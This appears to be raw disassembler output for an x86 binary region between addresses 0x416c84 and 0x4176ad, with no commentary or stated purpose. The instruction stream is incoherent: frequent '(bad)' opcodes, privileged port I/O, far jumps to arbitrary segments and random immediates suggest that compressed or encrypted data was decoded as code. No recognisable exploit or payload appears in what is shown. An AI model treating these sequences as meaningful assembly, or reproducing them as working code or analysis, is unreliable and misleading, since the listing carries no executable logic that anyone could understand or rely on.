  416c84:	xchg   BYTE PTR [edi+0x1362c943],al
  416c8a:	das    
  416c8b:	aam    0x6d
  416c8d:	jecxz  0x416ce8
  416c8f:	icebp  
  416c90:	aas    
  416c91:	fldpi  
  416c93:	ins    BYTE PTR es:[edi],dx
  416c94:	sbb    eax,0x8f3530bc
  416c99:	mov    dh,0x9c
  416c9b:	adc    BYTE PTR [ebx],0x6a
  416c9e:	rol    ah,0xc4
  416ca1:	adc    al,0xbd
  416ca3:	add    dl,BYTE PTR [ebp-0x4db5e00b]
  416ca9:	cmp    dh,BYTE PTR [ebx+0x204b23a]
  416caf:	sub    eax,0x4e9064c0
  416cb4:	loop   0x416cb6
	...
  416d16:	and    DWORD PTR [ebx-0x40445077],edx
  416d1c:	daa    
  416d1d:	lahf   
  416d1e:	or     DWORD PTR ds:0xb0fd80c9,edi
  416d24:	je     0x416ccf
  416d26:	(bad)  
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [eax],dl
  416d2f:	cdq    
  416d30:	push   ebp
  416d31:	lods   al,BYTE PTR ds:[esi]
  416d32:	shl    esp,1
  416d34:	xor    al,0xac
  416d36:	or     DWORD PTR [edi],ecx
  416d38:	outs   dx,DWORD PTR ds:[esi]
  416d39:	lock pop esp
  416d3b:	in     eax,dx
  416d3c:	mov    BYTE PTR [ebp-0x2b],dl
  416d3f:	es fmul DWORD PTR cs:[ebp-0x4b]
  416d44:	aad    0xd9
  416d46:	mov    al,0x54
  416d48:	sbb    al,BYTE PTR [esi]
  416d4a:	dec    eax
  416d4b:	mov    dl,0xb6
  416d4d:	push   es
  416d4e:	shl    DWORD PTR [esi+0x745e042a],0xbb
  416d55:	fcmovne st,st(4)
  416d57:	aad    0x93
  416d59:	mov    bl,0xdc
  416d5b:	dec    esp
  416d5c:	nop
  416d5d:	fmul   DWORD PTR [edx]
  416d5f:	aas    
  416d60:	test   al,0x46
  416d62:	call   0x1a13e0ab
  416d67:	jb     0x416dcc
  416d69:	cmp    BYTE PTR [edi+0x4c],ch
  416d6c:	rol    dh,1
  416d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d6f:	rcl    DWORD PTR [ebx+edi*1],1
  416d72:	(bad)  
  416d73:	outs   dx,BYTE PTR ds:[esi]
  416d74:	out    0xf1,eax
  416d76:	jno    0x416d3a
  416d78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d79:	arpl   bx,sp
  416d7b:	in     al,0xc5
  416d7d:	into   
  416d7e:	pop    ecx
  416d7f:	cmp    BYTE PTR [eax+edi*2+0x4696a606],dl
  416d86:	xchg   DWORD PTR [ebx-0x2d24585b],edx
  416d8c:	mov    eax,0x15200bb3
  416d91:	cmp    esp,edi
  416d93:	or     DWORD PTR [esi],ebx
  416d95:	mov    cl,0x51
  416d97:	inc    esp
  416d98:	jbe    0x416dbb
  416d9a:	lods   eax,DWORD PTR ds:[esi]
  416d9b:	mov    ch,0x22
  416d9d:	scas   al,BYTE PTR es:[edi]
  416d9e:	sbb    eax,0x617ce0ee
  416da3:	(bad)  
  416da4:	jl     0x416da3
  416da6:	mov    al,ds:0xd7175159
  416dab:	xor    esi,edi
  416dad:	mov    bh,0x9f
  416daf:	jmp    0x6bb7:0xe8595cb9
  416db6:	sar    DWORD PTR [ebp-0x4f],cl
  416db9:	xor    ebp,DWORD PTR [edi+0x65]
  416dbc:	mov    WORD PTR [edi],fs
  416dbe:	cmc    
  416dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dc0:	lds    ecx,FWORD PTR [esi+edi*2]
  416dc3:	mov    eax,0xfedfef7
  416dc8:	cdq    
  416dc9:	in     al,dx
  416dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dcb:	sub    DWORD PTR [eax+0x19],ecx
  416dce:	xchg   edi,eax
  416dcf:	dec    esp
  416dd0:	inc    ecx
  416dd1:	pop    edi
  416dd2:	outs   dx,BYTE PTR ds:[esi]
  416dd3:	out    dx,eax
  416dd4:	push   ss
  416dd5:	or     al,0x49
  416dd7:	jmp    0xd8959a00
  416ddc:	test   esi,eax
  416dde:	aas    
  416ddf:	sbb    al,0x75
  416de1:	xchg   esp,eax
  416de2:	das    
  416de3:	out    dx,al
  416de4:	cmp    al,0x44
  416de6:	js     0x416e4e
  416de8:	adc    eax,0x73abcc21
  416ded:	test   eax,0xde0ed3ec
  416df2:	jns    0x416df0
  416df4:	cmp    ebp,ecx
  416df6:	test   eax,0x89246f33
  416dfb:	js     0x416e04
  416dfd:	sub    DWORD PTR ds:0x4dcb58b6,edi
  416e03:	inc    ebx
  416e04:	pop    esp
  416e05:	popw   ss
  416e07:	das    
  416e08:	nop
  416e09:	dec    ebp
  416e0a:	test   al,0xef
  416e0c:	int3   
  416e0d:	jne    0x416def
  416e0f:	pop    esi
  416e10:	je     0x416df6
  416e12:	mov    gs,WORD PTR [esi]
  416e14:	jo     0x416dd6
  416e16:	out    0xab,al
  416e18:	cmp    DWORD PTR ds:0x574f949f,esp
  416e1e:	(bad)  [eax+eax*8+0x36]
  416e22:	jne    0x416e80
  416e24:	dec    edi
  416e25:	xchg   ecx,eax
  416e26:	lods   eax,DWORD PTR ds:[esi]
  416e27:	std    
  416e28:	jo     0x416daa
  416e2a:	lock jnp 0x416dd1
  416e2d:	out    0x71,al
  416e2f:	jg     0x416e46
  416e31:	and    DWORD PTR [edx+0x63c7],eax
	...
  416e93:	add    BYTE PTR [eax],al
  416e95:	add    BYTE PTR [edi-0x519271e7],bh
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8-0x30310415]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    cl,al
  416eaf:	jns    0x416e3f
  416eb1:	jae    0x416ece
  416eb3:	or     esi,DWORD PTR [ecx+0x6a3c6ed]
  416eb9:	mov    cl,0x98
  416ebb:	push   ebx
  416ebc:	mov    ch,0xff
  416ebe:	push   ecx
  416ebf:	add    ah,BYTE PTR [ecx-0x4f]
  416ec2:	(bad)  
  416ec3:	jns    0x416e47
  416ec5:	xchg   esi,eax
  416ec6:	xchg   edi,eax
  416ec7:	jmp    0x416ed0
  416ec9:	add    bl,BYTE PTR [eax+0x42]
  416ecc:	adc    DWORD PTR [esi-0x69],0xbcbb54a7
  416ed3:	pusha  
  416ed4:	out    dx,eax
  416ed5:	mov    dl,0x73
  416ed7:	mov    esp,0xccb10447
  416edc:	ins    BYTE PTR es:[edi],dx
  416edd:	mov    edx,DWORD PTR [edi]
  416edf:	jb     0x416f50
  416ee1:	push   esp
  416ee2:	xchg   esi,eax
  416ee3:	mov    WORD PTR [edi],gs
  416ee5:	fst    DWORD PTR [ebx+0x46]
  416ee8:	bound  esi,QWORD PTR [ebp-0xf40773b]
  416eee:	js     0x416ec3
  416ef0:	adc    ebx,DWORD PTR [ebp-0x10]
  416ef3:	(bad)  
  416ef4:	cmp    al,0x27
  416ef6:	loope  0x416f45
  416ef8:	add    cl,BYTE PTR [edi]
  416efa:	pop    esp
  416efb:	lahf   
  416efc:	test   eax,0xb88a8d48
  416f01:	mov    ds:0x31c9485d,al
  416f06:	inc    ecx
  416f07:	xchg   edx,eax
  416f08:	sbb    eax,0xa1fd401d
  416f0d:	mov    bl,0x5c
  416f0f:	aaa    
  416f10:	xchg   DWORD PTR [edx+ebp*1+0x27],edx
  416f14:	mov    ds:0xa3051e25,al
  416f19:	xchg   ah,bl
  416f1b:	and    edi,DWORD PTR [eax+esi*4]
  416f1e:	cld    
  416f1f:	and    ch,ch
  416f21:	les    edi,FWORD PTR [edi]
  416f23:	xor    esp,DWORD PTR [eax+esi*2-0x78d9749]
  416f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f2c:	pop    ebp
  416f2d:	jo     0x416fa1
  416f2f:	sub    edx,DWORD PTR [ebx+0x5d9facbd]
  416f35:	adc    al,0x6f
  416f37:	mov    dh,0x40
  416f39:	out    0xd,al
  416f3b:	call   0x3fc0:0x329ab62e
  416f42:	aad    0x65
  416f44:	cmp    al,0xbc
  416f46:	mov    ebx,0xd45b0255
  416f4b:	jmp    0x416f38
  416f4d:	ror    DWORD PTR [esi],cl
  416f4f:	jae    0x416f6c
  416f51:	adc    eax,0x271b6400
  416f56:	rcl    ebx,cl
  416f58:	xor    ch,bl
  416f5a:	(bad)  
  416f5c:	jle    0x416f56
  416f5e:	push   ecx
  416f5f:	(bad)  
  416f60:	jl     0x416eeb
  416f62:	lods   al,BYTE PTR ds:[esi]
  416f63:	outs   dx,BYTE PTR cs:[esi]
  416f65:	cmp    DWORD PTR [ebp-0x4c],edi
  416f68:	jno    0x416efa
  416f6a:	pop    ebp
  416f6b:	fstp   TBYTE PTR [edi-0x26d4071e]
  416f71:	mov    ecx,0x81124590
  416f76:	jmp    0x9f86:0x5b38be21
  416f7d:	push   cs
  416f7e:	es scas eax,DWORD PTR es:[edi]
  416f80:	outs   dx,DWORD PTR ds:[esi]
  416f81:	jno    0x416fa4
  416f83:	jmp    0x3fb:0xe7e3ee13
  416f8a:	call   DWORD PTR [esi-0x414bbdc6]
  416f90:	mov    esp,0xd3190f90
  416f95:	imul   ebp,DWORD PTR [ebx+esi*1-0x43],0xffffffaf
  416f9a:	mov    ch,0x18
  416f9c:	and    ecx,DWORD PTR [edi-0x6fd745b2]
  416fa2:	ins    DWORD PTR es:[edi],dx
  416fa3:	lea    eax,[ebx+ecx*2]
  416fa6:	add    BYTE PTR [edx],ch
  416fa8:	fcmovnu st,st(1)
  416faa:	mov    al,0x3a
  416fac:	and    DWORD PTR [eax-0x36e44fdd],esi
  416fb2:	imul   ebx,DWORD PTR [ecx-0x75],0x0
	...
  417015:	add    BYTE PTR [esi+0x2d],dh
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	sbb    ah,BYTE PTR [edi+edx*1+0xf0d486]
  417029:	add    BYTE PTR [edi],al
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    ah,bh
  41702f:	inc    esp
  417030:	inc    esi
  417031:	sub    al,0xcb
  417033:	jmp    0xf1962258
  417038:	mov    edx,0x9bce9428
  41703d:	popf   
  41703e:	xor    eax,0xdadccb75
  417043:	test   eax,0xe2ade060
  417048:	leave  
  417049:	jmp    0x995d:0xee690c4f
  417050:	ins    DWORD PTR es:[edi],dx
  417051:	fdiv   QWORD PTR [edi]
  417053:	ds add esp,0x73
  417057:	cmp    al,0x30
  417059:	cmc    
  41705a:	outs   dx,BYTE PTR ds:[esi]
  41705b:	pusha  
  41705c:	jne    0x4170bc
  41705e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41705f:	(bad)  
  417061:	sbb    ecx,DWORD PTR [edi]
  417063:	(bad)  
  417064:	adc    bl,bl
  417066:	jmp    0x490488d0
  41706b:	mov    esp,0x37b2ba7a
  417070:	adc    BYTE PTR [ebp+0x5f2fbd7],bl
  417076:	mov    dl,0x65
  417078:	mov    cl,BYTE PTR [ecx-0x28]
  41707b:	mov    ss,WORD PTR [esi-0x7c]
  41707e:	mov    DWORD PTR [ecx+0x1f],esi
  417081:	fldcw  WORD PTR [ecx+0x6e]
  417084:	dec    ebx
  417085:	jno    0x417069
  417087:	cmp    BYTE PTR [esi],0xbd
  41708a:	jns    0x417045
  41708c:	cli    
  41708d:	fsubr  st,st(6)
  41708f:	xor    DWORD PTR [ebx+0x5e],esi
  417092:	xchg   esp,ebp
  417094:	dec    esi
  417095:	ss retf 0xb1f3
  417099:	call   FWORD PTR [ecx]
  41709b:	add    esi,DWORD PTR [ecx+eiz*2-0x2]
  41709f:	xor    al,0x20
  4170a1:	enter  0xa6c8,0x75
  4170a5:	lahf   
  4170a6:	and    esp,DWORD PTR [esi]
  4170a8:	xchg   edx,eax
  4170a9:	(bad)  
  4170aa:	adc    ch,dh
  4170ac:	ret    0x217f
  4170af:	xor    dl,BYTE PTR [edx+edi*2]
  4170b2:	(bad)  
  4170b3:	mov    edx,ebp
  4170b5:	mov    dl,BYTE PTR [esi+0x78]
  4170b8:	mov    al,0xd2
  4170ba:	cld    
  4170bb:	sbb    al,0xab
  4170bd:	sahf   
  4170be:	add    DWORD PTR [ebx-0x63],edi
  4170c1:	xchg   ebx,eax
  4170c2:	jb     0x41709b
  4170c4:	ret    0x8b7e
  4170c7:	fistp  DWORD PTR [eax]
  4170c9:	test   bl,bl
  4170cb:	xchg   edx,eax
  4170cc:	push   eax
  4170cd:	xor    BYTE PTR [ebx],ch
  4170cf:	pop    ss
  4170d0:	retf   
  4170d1:	js     0x4170f1
  4170d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170d4:	xor    eax,0x4c4d3d96
  4170d9:	jmp    0x4170a8
  4170db:	nop
  4170dc:	inc    sp
  4170de:	dec    ebx
  4170df:	rcr    BYTE PTR [ebx],cl
  4170e1:	pop    ss
  4170e2:	xor    al,0x8c
  4170e4:	push   cs
  4170e5:	mov    bl,BYTE PTR [ebx+esi*2-0x4f3c092d]
  4170ec:	push   eax
  4170ed:	(bad)  
  4170ee:	or     esi,edx
  4170f0:	jns    0x417088
  4170f2:	xlat   BYTE PTR ds:[ebx]
  4170f3:	pop    eax
  4170f4:	ds mov ch,0x91
  4170f7:	mov    esp,0xff6699ab
  4170fc:	sub    al,0xb2
  4170fe:	test   al,0x6d
  417100:	add    bl,0x4c
  417103:	rcl    BYTE PTR [edx+esi*4-0x42c5f5d4],0x85
  41710b:	lock pop es
  41710d:	mov    edi,0x4e460e88
  417112:	test   DWORD PTR [eax],edx
  417114:	jecxz  0x417179
  417116:	mov    ebx,0x26dac53c
  41711b:	mov    ss,WORD PTR [ebx-0x4e]
  41711e:	out    dx,eax
  41711f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417120:	mov    eax,DWORD PTR [ecx+0x1f]
  417123:	call   0xc315:0xc26ba4a0
  41712a:	jp     0x41715f
  41712c:	xor    ch,BYTE PTR [eax]
  41712e:	add    eax,0x9c133998
  417133:	push   esi
  417134:	jns    0x417136
	...
  417196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417197:	sbb    DWORD PTR [eax+0x1a],esi
  41719a:	(bad)  
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	dec    ebx
  4171a3:	test   al,0x2f
  4171a5:	cld    
  4171a6:	fcomi  st,st(1)
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [edi+0x1b5c3101],bl
  4171b3:	inc    eax
  4171b4:	out    dx,eax
  4171b5:	cmp    DWORD PTR [edx+0x270d545f],eax
  4171bb:	push   edx
  4171bc:	and    edi,ebx
  4171be:	dec    edi
  4171bf:	push   eax
  4171c0:	call   0xfe36:0xd781231d
  4171c7:	imul   ebp,DWORD PTR [edi],0x341abcdf
  4171cd:	cmp    BYTE PTR [ebx],bh
  4171cf:	dec    ebp
  4171d0:	fsub   QWORD PTR [esi]
  4171d2:	adc    bh,0xbd
  4171d5:	pop    edx
  4171d6:	call   0xb63b:0xfb25c9dd
  4171dd:	or     eax,0x20704d0
  4171e2:	(bad)  
  4171e3:	xchg   esi,eax
  4171e4:	mov    ebp,DWORD PTR [ecx+ebp*1-0x7657fd59]
  4171eb:	cmp    eax,0xc9423c99
  4171f0:	jno    0x417192
  4171f2:	push   cs
  4171f3:	or     BYTE PTR [esi-0x27],bl
  4171f6:	fs stos BYTE PTR es:[edi],al
  4171f8:	test   DWORD PTR [esi+0x12],ebp
  4171fb:	inc    eax
  4171fc:	dec    eax
  4171fd:	ins    DWORD PTR es:[edi],dx
  4171fe:	mov    ecx,0xb1872b03
  417203:	or     BYTE PTR [eax+0x52],bh
  417206:	nop
  417207:	hlt    
  417208:	mov    ch,cl
  41720a:	rcr    DWORD PTR [edi+eax*1-0x34772b9c],0x11
  417212:	xor    BYTE PTR [edi],al
  417214:	mov    ecx,0x5a0df914
  417219:	pop    eax
  41721a:	jp     0x4171a3
  41721c:	inc    esi
  41721d:	clc    
  41721e:	mov    al,ds:0xa4ce5937
  417223:	or     eax,0x54e00ada
  417228:	(bad)  
  417229:	in     al,dx
  41722a:	dec    eax
  41722b:	repz test al,0x2b
  41722e:	sbb    esp,DWORD PTR [ecx]
  417230:	push   esi
  417231:	adc    ecx,DWORD PTR [edx+0x2a]
  417234:	mov    ds:0x4d0734a4,eax
  417239:	adc    BYTE PTR [ecx],bh
  41723b:	jl     0x41724f
  41723d:	and    DWORD PTR [ebp-0x76],ebp
  417240:	popa   
  417241:	xor    al,BYTE PTR [ebp+0x1676de96]
  417247:	mov    eax,ds:0x67a7f62b
  41724c:	jne    0x417266
  41724e:	inc    esp
  41724f:	test   BYTE PTR [ebx+0x5b5f95f7],0x63
  417256:	sbb    al,ah
  417258:	push   ebp
  417259:	pop    ds
  41725a:	or     ah,BYTE PTR [esi-0x2c]
  41725d:	cmp    al,0x94
  41725f:	jp     0x41728e
  417261:	push   ebp
  417262:	mov    WORD PTR [eax],es
  417264:	(bad)  
  417265:	push   0x975374e1
  41726a:	(bad)  
  41726b:	sbb    bl,dh
  41726d:	hlt    
  41726e:	imul   eax,esi,0x447e3eb7
  417274:	cs dec edx
  417276:	or     eax,0x54deb6f5
  41727b:	packssdw mm3,QWORD PTR [edx-0x11]
  41727f:	test   ebx,edi
  417281:	adc    DWORD PTR [eax],esi
  417283:	push   cs
  417284:	cmp    DWORD PTR [ecx-0x5d0de72f],esp
  41728a:	push   ds
  41728b:	mov    eax,ds:0x97df363f
  417290:	inc    esi
  417291:	inc    esi
  417292:	mov    eax,DWORD PTR [esi+0x4f]
  417295:	div    DWORD PTR [eax+0x15]
  417298:	jg     0x4172d8
  41729a:	int    0xc1
  41729c:	sub    ch,dh
  41729e:	cli    
  41729f:	add    ch,BYTE PTR [esi-0x52]
  4172a2:	popa   
  4172a3:	push   edi
  4172a4:	sub    ebx,DWORD PTR [esi-0x26]
  4172a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172a8:	push   esi
  4172a9:	clc    
  4172aa:	icebp  
  4172ab:	imul   ecx,DWORD PTR [ebx],0xacf4be2a
  4172b1:	std    
  4172b2:	ds adc al,0xcf
	...
  417315:	add    BYTE PTR [ecx-0x44],ch
  417318:	xlat   BYTE PTR ds:[ebx]
  417319:	pop    esi
  41731a:	xlat   BYTE PTR ds:[ebx]
  41731b:	jg     0x417306
  41731d:	mov    edi,0x85e5bf4a
  417322:	ins    DWORD PTR es:[edi],dx
  417323:	sub    al,0xe7
  417325:	shl    edx,0xf2
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    BYTE PTR [ecx],bl
  41732f:	mov    esi,0x602cbf0e
  417334:	mov    DWORD PTR [eax+eiz*1+0x62],ecx
  417338:	arpl   WORD PTR [edx+ebp*4],sp
  41733b:	pop    edi
  41733c:	ins    BYTE PTR es:[edi],dx
  41733d:	push   esp
  41733e:	dec    eax
  41733f:	dec    ecx
  417340:	cmp    BYTE PTR [esi+0x638ab967],dh
  417346:	stc    
  417347:	jmp    DWORD PTR [ebx]
  417349:	xlat   BYTE PTR ds:[ebx]
  41734a:	xor    eax,0x506172e3
  417350:	xchg   edx,eax
  417351:	imul   edi,DWORD PTR [ecx-0x77b2dc51],0x5a
  417358:	inc    ebx
  417359:	popf   
  41735a:	xor    esp,DWORD PTR [ecx]
  41735c:	cmp    dh,BYTE PTR [esi-0x5e]
  41735f:	(bad)  
  417360:	enter  0x4e49,0xb
  417364:	sub    bh,BYTE PTR [eax-0x57]
  417367:	xor    al,0xda
  417369:	daa    
  41736a:	pusha  
  41736b:	jmp    0x3869:0xaf74e143
  417372:	outs   dx,DWORD PTR ds:[esi]
  417373:	inc    ebx
  417374:	dec    edi
  417375:	push   esi
  417376:	xchg   esp,eax
  417377:	pop    ebp
  417378:	mov    DWORD PTR [eax-0x1e],eax
  41737b:	(bad)  
  41737c:	and    BYTE PTR [esi],ah
  41737e:	or     dl,al
  417380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417381:	xor    BYTE PTR [eax],ch
  417383:	outs   dx,BYTE PTR ds:[esi]
  417384:	or     BYTE PTR [ecx-0x6f],cl
  417387:	ins    DWORD PTR es:[edi],dx
  417388:	xchg   esi,eax
  417389:	lock dec esp
  41738b:	ss jmp 0x9f65:0xb3db72e2
  417393:	rol    DWORD PTR es:[edx+0x64a01bff],cl
  41739a:	or     BYTE PTR [ebx+0x6d],ch
  41739d:	xchg   DWORD PTR [ebx-0x52a5fbe3],ebx
  4173a3:	sahf   
  4173a4:	mov    ds:0xab5f79cf,al
  4173a9:	ins    BYTE PTR es:[edi],dx
  4173aa:	jo     0x4173d1
  4173ac:	retf   
  4173ad:	stc    
  4173ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173af:	idiv   BYTE PTR ds:0x5691a6ae
  4173b5:	jb     0x417351
  4173b7:	xchg   ebx,eax
  4173b8:	cmc    
  4173b9:	fsubr  st,st(6)
  4173bb:	es cli 
  4173bd:	inc    eax
  4173be:	mov    bh,0xe1
  4173c0:	or     eax,0x504477a2
  4173c5:	xor    BYTE PTR [edi],bl
  4173c7:	fidivr WORD PTR [eax+esi*4]
  4173ca:	test   al,0x3a
  4173cc:	retf   0x80c6
  4173cf:	sbb    ebx,edx
  4173d1:	or     al,0x8a
  4173d3:	cmp    DWORD PTR [edx+0x58e57eb3],ebp
  4173d9:	repnz fwait
  4173db:	mov    al,ds:0xc4ddbf0c
  4173e0:	jle    0x417455
  4173e2:	xor    eax,0x9936cfa3
  4173e7:	into   
  4173e8:	sbb    ah,cl
  4173ea:	(bad)  
  4173eb:	retf   
  4173ec:	shl    DWORD PTR [ebx],1
  4173ee:	xchg   ebp,eax
  4173ef:	sbb    BYTE PTR [esp+ebp*4-0x6ca5ca2c],dl
  4173f6:	in     eax,0x5e
  4173f8:	test   eax,0xa0f90abb
  4173fd:	add    ch,ah
  4173ff:	ja     0x4173a9
  417401:	dec    eax
  417402:	mov    DWORD PTR [ebx],ecx
  417404:	pop    edi
  417405:	add    ch,BYTE PTR [ecx+edx*4]
  417408:	jge    0x417401
  41740a:	sub    eax,0xcf05d8b6
  41740f:	or     eax,0x21039070
  417414:	mov    ah,BYTE PTR [eax+0x226b7e26]
  41741a:	mov    ebx,0xe52c0e13
  41741f:	push   0xffffff89
  417421:	sbb    cl,BYTE PTR [ebx-0x49b7037b]
  417427:	fs dec esi
  417429:	xor    esi,DWORD PTR [ebx+0x23]
  41742c:	lahf   
  41742d:	or     cl,BYTE PTR [edi]
  41742f:	cs mov eax,0x563c118a
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	mov    esp,0xe96d8df1
  4174a7:	repz add BYTE PTR [eax],al
  4174aa:	pop    es
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR [edi+0x35],ch
  4174b0:	jbe    0x41743a
  4174b2:	jp     0x41748b
  4174b4:	(bad)  
  4174b5:	fcomp  DWORD PTR [ebx-0x69deaf1]
  4174bb:	inc    esi
  4174bc:	arpl   WORD PTR [edi-0x40089919],di
  4174c2:	adc    eax,0x915eb6df
  4174c7:	stos   DWORD PTR es:[edi],eax
  4174c8:	sti    
  4174c9:	dec    edx
  4174ca:	xor    al,0x12
  4174cc:	pushf  
  4174cd:	aad    0x9c
  4174cf:	add    eax,0x71187f8d
  4174d4:	adc    DWORD PTR [ebx-0xa],eax
  4174d7:	jae    0x41753a
  4174d9:	(bad)  
  4174da:	push   ecx
  4174db:	sub    dl,BYTE PTR ds:0xc61b57e
  4174e1:	(bad)  
  4174e2:	dec    ebx
  4174e3:	loop   0x41752e
  4174e5:	sub    ch,BYTE PTR [ecx-0x20]
  4174e8:	cmp    al,0xf3
  4174ea:	jmp    0x417554
  4174ec:	test   eax,0x133de03b
  4174f1:	push   esp
  4174f2:	(bad)  
  4174f3:	icebp  
  4174f4:	push   0xf
  4174f6:	inc    edx
  4174f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f8:	das    
  4174f9:	pop    esi
  4174fa:	pushf  
  4174fb:	pop    edi
  4174fc:	ss adc ecx,eax
  4174ff:	lea    ebp,fs:[esi-0x79]
  417503:	fdivr  DWORD PTR [eax]
  417505:	dec    ebp
  417506:	lds    esi,FWORD PTR [esi+0x24c6eb86]
  41750c:	js     0x417505
  41750e:	jge    0x4174ce
  417510:	aaa    
  417511:	cld    
  417512:	jl     0x4174bd
  417514:	and    al,0x2f
  417516:	cmc    
  417517:	xchg   esp,eax
  417518:	inc    esp
  417519:	jnp    0x4174af
  41751b:	jo     0x4174e1
  41751d:	lods   eax,DWORD PTR ds:[esi]
  41751e:	adc    eax,0x1a1784ff
  417523:	hlt    
  417524:	xor    eax,0x91b4ceb
  417529:	les    esp,FWORD PTR [ecx]
  41752b:	addr16 jp 0x4174ce
  41752e:	pushf  
  41752f:	outs   dx,BYTE PTR ds:[esi]
  417530:	push   ds
  417531:	imul   DWORD PTR [eax]
  417533:	fisttp WORD PTR [ecx-0x9]
  417536:	fwait
  417537:	jmp    0x4174c3
  417539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41753a:	sti    
  41753b:	jbe    0x4174c5
  41753d:	dec    eax
  41753e:	inc    eax
  41753f:	jp     0x4174c8
  417541:	mov    DWORD PTR [ecx],edx
  417543:	mov    eax,0x46db9b2a
  417548:	loope  0x4174d2
  41754a:	mov    al,0x24
  41754c:	inc    esp
  41754d:	inc    esp
  41754e:	jo     0x417570
  417550:	mov    ch,0x8a
  417552:	inc    DWORD PTR [esi+0x53c6db1f]
  417558:	push   esp
  417559:	and    DWORD PTR [esi],ebx
  41755b:	mov    eax,ds:0x8d4e8d67
  417560:	push   ecx
  417561:	je     0x41759c
  417563:	mov    eax,0x3926ddae
  417568:	(bad)  
  417569:	jp     0x41759d
  41756b:	into   
  41756c:	fstp   DWORD PTR [ecx]
  41756e:	fdiv   DWORD PTR [eax]
  417570:	test   eax,0x20f050f0
  417575:	in     al,dx
  417576:	sub    BYTE PTR [esi+0x50821983],ch
  41757c:	xor    al,dl
  41757e:	mov    ebx,0xe100b40f
  417583:	(bad)  
  417584:	jmp    0xfd0b:0x2a9c1bd0
  41758b:	(bad)  
  41758c:	mov    ds:0x9f4eaff0,al
  417591:	adc    ebp,DWORD PTR [edx+edx*4-0x2e64def6]
  417598:	fucom  st(4)
  41759a:	enter  0x1241,0xb5
  41759e:	sbb    cl,BYTE PTR [edx+0x46]
  4175a1:	icebp  
  4175a2:	or     dh,BYTE PTR [esi]
  4175a4:	jno    0x417607
  4175a6:	xor    eax,0xd4671bbb
  4175ab:	xor    dl,bh
  4175ad:	dec    ecx
  4175ae:	push   es
  4175af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b0:	adc    eax,DWORD PTR fs:[esi+0x53]
  4175b4:	outs   dx,DWORD PTR ds:[esi]
	...
  417615:	add    BYTE PTR [ecx-0x20b02c99],ch
  41761b:	(bad)  
  41761c:	mov    ebp,0x670b0ae7
  417621:	fcom   DWORD PTR [edi-0x2e]
  417624:	mov    ah,0xfe
  417626:	lock hlt 
  417628:	add    BYTE PTR [eax],al
  41762a:	pop    es
  41762b:	add    DWORD PTR [eax],eax
  41762d:	add    BYTE PTR [edx+eiz*4],bl
  417630:	or     BYTE PTR [edi],bl
  417632:	pop    edi
  417633:	lea    esi,[ecx+0x54]
  417636:	cld    
  417637:	sar    ah,cl
  417639:	cdq    
  41763a:	mov    eax,ds:0x6e361128
  41763f:	icebp  
  417640:	shr    BYTE PTR [edx+0x28],1
  417643:	pusha  
  417644:	mov    ebx,0x8ebe8778
  417649:	sub    bl,BYTE PTR [edi+0x7dd29619]
  41764f:	cmc    
  417650:	gs inc esi
  417652:	and    cl,bl
  417654:	push   ss
  417655:	mov    eax,0x49fbd4af
  41765a:	mov    ds:0x3a38a916,eax
  41765f:	mov    al,ds:0xfa2c8630
  417664:	cmp    al,0xfd
  417666:	xchg   ebx,eax
  417667:	inc    esp
  417668:	sahf   
  417669:	imul   edx,DWORD PTR [ebp-0x7a],0x7b
  41766d:	sbb    BYTE PTR ds:0xa2ba4fcc,bh
  417673:	push   ebx
  417674:	jmp    0xe68d:0xdb803690
  41767b:	dec    esi
  41767c:	shl    DWORD PTR [eax-0xfb1af95],0x9a
  417683:	sub    BYTE PTR [edi],al
  417685:	out    0xb3,eax
  417687:	cmp    bh,BYTE PTR cs:[edi]
  41768a:	retf   0xa972
  41768d:	mov    dh,0x21
  41768f:	pop    edi
  417690:	sbb    eax,0x11d05ce6
  417695:	or     BYTE PTR [ebx],bl
  417697:	xchg   DWORD PTR [ebp-0x1],eax
  41769a:	stos   BYTE PTR es:[edi],al
  41769b:	adc    eax,0x42db1492
  4176a0:	lods   eax,DWORD PTR ds:[esi]
  4176a1:	jns    0x417693
  4176a3:	(bad)  
  4176a4:	out    dx,al
  4176a5:	mov    ds:0x237bb434,al
  4176aa:	dec    ecx
  4176ab:	mov    ah,0xa6
  4176ad:	addr16 xchg edx,eax
